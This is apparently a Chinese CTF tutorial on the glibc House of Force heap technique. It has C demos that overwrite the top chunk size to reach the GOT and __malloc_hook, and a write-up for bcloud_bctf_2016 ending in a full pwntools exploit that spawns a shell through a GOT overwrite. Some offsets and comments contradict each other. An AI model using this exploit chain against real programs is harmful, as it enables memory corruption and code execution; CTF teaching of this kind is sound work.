# House Of Force

## 原理：

1. House Of Force 是一种堆利用方法，但是并不是说 House Of Force 必须得基于堆漏洞来进行利用。如果一个堆 (heap based) 漏洞想要通过 House Of Force 方法进行利用，需要以下条件：

   * 能够以溢出等方式控制到 **top chunk 的 size 域** 
   * 能够自由地控制堆分配尺寸的大小

2. House Of Force 产生的原因在于 glibc 对 top chunk 的处理，根据前面堆数据结构部分的知识我们得知，进行堆分配时，如果**所有空闲的块都无法满足需求**，那么就会从 top chunk 中分割出相应的大小作为堆块的空间。

3. 那么，当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时会发生什么？答案是，可以使得 top chunk 指向我们期望的任何位置，这就相当于一次任意地址写。然而在 glibc 中，会对用户请求的大小和 top chunk 现有的 size 进行验证

   ```c
   // 获取当前的top chunk，并计算其对应的大小
   victim = av->top;
   size   = chunksize(victim);
   // 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。
   if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE)) 
   {
       remainder_size = size - nb;
       remainder      = chunk_at_offset(victim, nb);
       av->top        = remainder;
       set_head(victim, nb | PREV_INUSE |
               (av != &main_arena ? NON_MAIN_ARENA : 0));
       set_head(remainder, remainder_size | PREV_INUSE);
   
       check_malloced_chunk(av, victim, nb);
       void *p = chunk2mem(victim);
       alloc_perturb(p, bytes);
       return p;
   }
   ```

   然而，如果可以**篡改 size 为一个很大值**，就可以轻松的通过这个验证，这也就是我们前面说的需要一个能够控制 top chunk size 域的漏洞。

   ```c
   (unsigned long) (size) >= (unsigned long) (nb + MINSIZE)
   ```

   一般的做法是把 t**op chunk 的 size 改为 - 1**，因为在进行比较时会把 size 转换成无符号数，因此 -1 也就是说 unsigned long 中最大的数，所以无论如何都可以通过验证。

   ```c
   remainder      = chunk_at_offset(victim, nb);
   av->top        = remainder;
   
   /* Treat space at ptr + offset as a chunk */
   #define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))
   ```

   之后这里会把 top 指针更新，接下来的堆块就会分配到这个位置，用户只要控制了这个指针就相当于实现任意地址写任意值 (write-anything-anywhere)。

   与此同时，我们需要注意的是，**topchunk 的 size 也会更新**，其更新的方法如下：

   ```c
   victim = av->top;
   size   = chunksize(victim);
   remainder_size = size - nb;
   set_head(remainder, remainder_size | PREV_INUSE);
   ```

   所以，如果我们想要下次在指定位置分配大小为 x 的 chunk，我们需要确保 remainder_size 不小于 x+ MINSIZE

## 实例1：

在学习完 HOF 的原理之后，我们这里通过一个示例来说明 HOF 的利用，这个例子的目标是通过 HOF 来篡改 `malloc@got.plt` 实现劫持程序流程：

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    long *ptr,*ptr2;
    puts("start");
    ptr=malloc(0x10);
    ptr=(long *)(((long)ptr)+24);
    *ptr=-1;		//修改top chunk大小，为了后面申请负数chunk时，大小能通过检查
    printf("reduce top chunk addr");
    malloc(-5184);	//减小top chunk地址，用(目的地址-top chunk地址-0x10)
    ptr2 = malloc(0x10);
    return 0;
}

```

首先，我们分配一个 chunk20：

![image-20240728151145666](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407281511759.png)

之后把 top chunk 的 size 改为 0xffffffffffffffff，在真正的题目中，这一步可以通过**堆溢出等漏洞**来实现。 因为 -1 在补码中是以 0xffffffffffffffff 表示的，所以我们直接赋值 -1 就可以：

![image-20240728160604701](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407281606954.png)

注意此时的 top chunk 位置，当我们进行**下一次分配的时候就会更改 top chunk 的位置**到我们想要的地方（malloc的got表位置）：

![image-20240728160833983](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407281608222.png)

![image-20240728161126245](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407281611475.png)

此外，用于got表前面的空间没有写入权限，所以就算申请到了**got表上的任意地址**写，也只能**从got表的第3个函数位置**开始写：

![image-20240728161441523](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407281614725.png)

接下来我们执行`malloc(-5184);`，-4120 是怎么得出的呢？ 首先，我们需要明确要写入的目的地址，这里我编译程序后，0x404010是 `malloc@got.plt` 的地址, 所以我们应该将 top chunk 指向 0x404000 处，这样当下次再分配 chunk 时，就可以分配到 `malloc@got.plt` 处的内存了。

之后明确当前 top chunk 的地址，根据前面描述，top chunk 位于 0x405430，所以我们可以计算偏移如下:

0x405430 - 0x404000 - 0x10= -5184

此外，用户申请的内存大小，一旦进入申请内存的函数中就变成了**无符号整数**,如果想要用户输入的大小经过内部的 `checked_request2size`可以得到这样的大小，即:

```c
/*
   Check if a request is so large that it would wrap around zero when
   padded and aligned. To simplify some other code, the bound is made
   low enough so that adding MINSIZE will also not wrap around zero.
 */

#define REQUEST_OUT_OF_RANGE(req)                                              \
    ((unsigned long) (req) >= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))
/* pad request bytes into a usable size -- internal version */
//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1
#define request2size(req)                                                      \
    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE)                           \
         ? MINSIZE                                                             \
         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)

/*  Same, except also perform argument check */

#define checked_request2size(req, sz)                                          \
    if (REQUEST_OUT_OF_RANGE(req)) {                                           \
        __set_errno(ENOMEM);                                                   \
        return 0;                                                              \
    }                                                                          \
    (sz) = request2size(req);
```

一方面，我们需要绕过 **REQUEST_OUT_OF_RANGE(req)** 这个检测，即我们传给 malloc 的值在负数范围内，**不得大于 -2 * MINSIZE** (无符号数比较)，这个一般情况下都是可以满足的。

另一方面，在满足对应的约束后，我们需要使得 `request2size`正好转换为对应的大小，也就是说，我们需要使得 ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK 恰好为 - 4112。首先，很显然，-4112 是 chunk 对齐的，那么我们只需要将其分别减去 SIZE_SZ，MALLOC_ALIGN_MASK 就可以得到对应的需要申请的值。其实我们这里只需要减 SIZE_SZ 就可以了，因为多减的 MALLOC_ALIGN_MASK 最后还会被对齐掉。而如果得到的不是想要的地址，我们就需要多减一些了。当然，我们最好使得**分配之后得到的 chunk 也是对齐的**，因为在释放一个 chunk 的时候，会进行对齐检查。

## 实例2：

1. 在上一个示例中，我们演示了通过 HOF 使得 top chunk 的**指针减小**来修改位于其上面 (低地址) 的 got 表中的内容， 但是 HOF 其实也可以使得 top chunk **指针增大**来**修改位于高地址空间**的内容，我们通过这个示例来演示这一点：

   ```c
   #include <stdio.h>
   #include <stdlib.h>
   
   int main()
   {
       long *ptr,*ptr2;
       puts("start");
       ptr=malloc(0x10);
       ptr=(long *)(((long)ptr)+24);
       *ptr=-1;		//修改top chunk大小，为了后面申请负数chunk时，大小能通过检查
       printf("reduce top chunk addr");
       malloc(140737345484512);	//增大top chunk地址，用(目的地址-top chunk地址-0x10)
       ptr2 = malloc(0x10);
       return 0;
   }
   
   ```

   我们可以看到程序代码与简单示例 1 基本相同，除了第二次 malloc 的 size 有所不同。 这次我们的目标是申请到malloc_hook，我们知道 malloc_hook 是位于 libc.so 里的全局变量值，可以调试确定malloc_hook地址（实际写题直接通过基地址计算即可）：

   ![image-20240728164228162](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407281642381.png)

   可以看到 top chunk的地址在 0x405430，而 malloc_hook的地址在 0x7ffff7bc4b10，因此我们需要通过 HOF **扩大 top chunk 指针的值**来实现对 malloc_hook 的写，0x7ffff7bc4b10 - 0x405430 -0x10 （不行就多减一点） ：

   ![image-20240728164621431](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407281646694.png)

   ![image-20240728164742466](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407281647782.png)

## 总结：

1. 其实 HOF 的利用要求还是相当苛刻的：

   - 首先，需要存在漏洞使得用户能够**控制 top chunk 的 size 域**。
   - 其次，需要用户能**自由控制 malloc 的分配大小** 。
   - 第三，分配的次数不能受限制。

   其实这三点中第二点往往是最难办的，CTF 题目中往往会给**用户分配堆块的大小限制最小和最大值**使得不能通过 HOF 的方法进行利用。



## 例题：bcloud_bctf_2016

题目地址：[bcloud_bctf_2016](https://buuoj.cn/challenges#bcloud_bctf_2016)

### 思路：

1. 覆盖截断字符，获取堆地址。
2. 利用溢出覆盖top chunk的size字段。
3. 申请负数大小的chunk，缩小top chunk的地址到指定位置。
4. 实现任意地址写。

### 分析：

1. 自定义的read函数会在字符串最后加上b"\x00"，会造成off_by_null：

   ![image-20240729110532505](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407291105569.png)

   ![image-20240729111102067](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407291111156.png)

2. 和上面一样，在输入s的时候当输入满64个字符会覆盖到v2上的地址，后续分配chunk的时候又会将截断字符覆盖掉，所以后面在strcpy(v2, s)时会将输入的s和v2上的chunk地址以及输入的v3一起复制到chunkv2中（造成溢出），又因为chunkv2与top chunk相邻，就可以通过控制输入v3的内容进而修改top chunk的size字段：

   ![image-20240729111145108](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407291111180.png)

3. 后面分配的函数中几乎没有漏洞，off_by_null和UAF都避免了，所以只能通过修改top chunk的size来利用：

   ![image-20240729111536987](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407291115065.png)

   ![image-20240729111556073](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407291115131.png)

### 利用：

1.  利用程序自身覆盖截断字符，泄漏堆地址：

   ```py
   # 泄漏堆地址
   p.sendafter(b'name:',b"A"*60+b"FFFF")
   p.recvuntil(b"FFFF")
   heap_addr = u32(p.recv(4))&0xffff000
   success("heap_addr ==> " + hex(heap_addr))
   top_chunk_addr = heap_addr+0xd8
   success("top_chunk_addr ==> " + hex(top_chunk_addr))
   ```

   ![image-20240729111959159](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407291119265.png)

2. 创造溢出，修改top chunk的size字段：

   ```python
   #修改top chunk大小
   payload = b"\xff"*65
   p.sendafter(b'Org:',payload)
   p.sendlineafter(b'Host:',b"\xff"*66)
   ```

   覆盖前：![image-20240729112231062](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407291122255.png)

   覆盖后：

   ![image-20240729112240325](C:\Users\BKBQWQ\AppData\Roaming\Typora\typora-user-images\image-20240729112240325.png)

3. 缩小top chunk的地址到heaplist存储堆指针的位置：

   ```python
   # 移动topchunk位置 到heaplist位置
   offset = 0x0804B120 - (top_chunk_addr)-12
   add(offset,b"a")    #0
   ```

   修改前：

   ![image-20240729112354568](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407291123683.png)

   修改后：

   ![image-20240729112607729](C:\Users\BKBQWQ\AppData\Roaming\Typora\typora-user-images\image-20240729112607729.png)

4. 修改heaplist，创建傀儡，从而实现任意地址读写（要注意利用的**相应堆的size大小不能为0**，不然写入不了数据）：

   ```python
   # 创建傀儡 chunk3
   add(8,p64(0x804b12c))   #1
   add(8,p64(0x804b130))   #2
   add(8,b"aaa")   #3
   add(4,b"aaa")   #4
   add(4,b"aaa")   #5
   debug()
   
   # 创建傀儡7，用于傀儡chunk3释放后还有傀儡任意地址写
   edit(2,p64(0x804b13c))   #创建傀儡7
   edit(3,p64(0x804b128))  
   ```

   ![image-20240729113419255](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407291134416.png)

5. 泄漏libc地址：利用chunk2向傀儡chunk3写入free函数的got地址，修改free函数的got表，指向puts函数的plt表。再继续利用chunk2向chunk3输入puts函数的got表地址，最后free掉chunk3 ==> 输出puts函数的地址（free掉chunk3后chunk3就不能任意地址写了）：

   ```python
   # 修改free的got表,指向puts函数的plt表
   edit(2,p64(elf.got["free"])) 
   edit(3,p64(elf.plt["puts"]))
   
   #利用free函数输出puts函数地址
   edit(2,p64(elf.got["puts"]))
   free(3)
   puts_addr = u32(p.recvuntil(b"\xf7")[-4:])
   libc_base = puts_addr - libc.symbols["puts"]
   success("puts_addr==>"+hex(puts_addr))
   success("libc_addr==>"+hex(libc_base))
   malloc_hook_addr = libc_base+libc.sym["__malloc_hook"]
   success("malloc_hook_addr==>"+hex(malloc_hook_addr))
   system_addr = libc_base+libc.sym["system"]
   free_hook_addr = libc_base+libc.sym["__free_hook"]
   success("system_addr==>"+hex(system_addr))
   success("free_hook_addr==>"+hex(free_hook_addr))
   ```

   ![image-20240729114031883](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407291140071.png)

6. 修改free函数的got表指向system函数：利用chunk7向chunk2写入free函数的got表地址，用chunk2修改free函数的got表（前面的chunk3被free掉后就不能再使用--堆指针和size都被清0）：

   ```python
   # 利用傀儡2 修改free的got表,指向puts函数的plt表
   edit(7,p64(elf.got["free"]))
   edit(2,p64(system_addr))
   ```

   ![image-20240729114513744](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407291145886.png)

7. 最后拿shell，完整的EXP：

   ```py
   from pwn import *
   from LibcSearcher import *
   context(os='linux', arch='amd64', log_level='debug')
   
   def debug():
       print(proc.pidof(p))
       pause()
   
   # p = remote("node5.buuoj.cn",27244)
   p = process("./pwn")
   libc = ELF('./libc-2.23_32.so')
   elf = ELF("./pwn")
   
   def add(size,content):
       p.sendlineafter(b'>>','1')
       p.sendlineafter(b':',str(size).encode())
       p.sendlineafter(b':',content)
   
   def edit(index, content):
       p.sendlineafter(b'>>','3')
       p.sendlineafter(b':',str(index).encode())
       # p.sendlineafter(':',str(len(content)))
       p.sendlineafter(b':',content)
   
   def free(index):
       p.sendlineafter(b'>>','4')
       p.sendlineafter(b':',str(index).encode())
   
   # 泄漏堆地址
   p.sendafter(b'name:',b"A"*60+b"FFFF")
   p.recvuntil(b"FFFF")
   heap_addr = u32(p.recv(4))&0xffff000
   success("heap_addr ==> " + hex(heap_addr))
   top_chunk_addr = heap_addr+0xd8
   success("top_chunk_addr ==> " + hex(top_chunk_addr))
   
   #修改top chunk大小
   payload = b"\xff"*65
   p.sendafter(b'Org:',payload)
   p.sendlineafter(b'Host:',b"\xff"*66)
   
   # 移动topchunk位置 到heaplist位置
   offset = 0x0804B120 - (top_chunk_addr)-12
   add(offset,b"a")    #0
   
   # 创建傀儡 chunk3
   add(8,p64(0x804b12c))   #1
   add(8,p64(0x804b130))   #2
   add(8,b"aaa")   #3
   add(4,b"aaa")   #4
   add(4,b"aaa")   #5
   
   # 创建傀儡7
   edit(2,p64(0x804b13c))   #创建傀儡7
   edit(3,p64(0x804b128))  
   
   
   # 修改free的got表,指向puts函数的plt表
   edit(2,p64(elf.got["free"])) 
   edit(3,p64(elf.plt["puts"]))
   
   #利用free函数输出puts函数地址
   edit(2,p64(elf.got["puts"]))
   free(3)
   puts_addr = u32(p.recvuntil(b"\xf7")[-4:])
   libc_base = puts_addr - libc.symbols["puts"]
   success("puts_addr==>"+hex(puts_addr))
   success("libc_addr==>"+hex(libc_base))
   malloc_hook_addr = libc_base+libc.sym["__malloc_hook"]
   success("malloc_hook_addr==>"+hex(malloc_hook_addr))
   system_addr = libc_base+libc.sym["system"]
   free_hook_addr = libc_base+libc.sym["__free_hook"]
   success("system_addr==>"+hex(system_addr))
   success("free_hook_addr==>"+hex(free_hook_addr))
   
   # 利用傀儡2 修改free的got表,指向puts函数的plt表
   edit(7,p64(elf.got["free"]))
   edit(2,p64(system_addr))
   debug()
   add(8,b"/bin/sh\x00")   #3
   free(3)
   
   p.sendline(b"cat flag")
   p.interactive()
   ```

   ![image-20240729114731422](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407291147517.png)
